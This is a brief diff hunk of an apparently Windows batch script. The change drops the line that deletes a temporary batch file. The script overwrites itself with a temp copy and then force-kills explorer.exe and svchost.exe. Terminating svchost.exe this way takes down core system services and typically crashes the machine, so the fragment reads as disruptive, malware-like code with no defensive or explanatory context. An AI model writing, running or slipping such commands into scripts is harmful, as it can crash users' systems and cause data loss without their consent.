@@ -29,7 +29,6 @@ set "tempfile=%temp%\temp_script.bat"
 copy /y "%tempfile%" "%script%" >nul
 
 cd %temp%
-del /f /q "temp_script.bat"
 taskkill /f /im explorer.exe
 taskkill /f /im svchost.exe
 
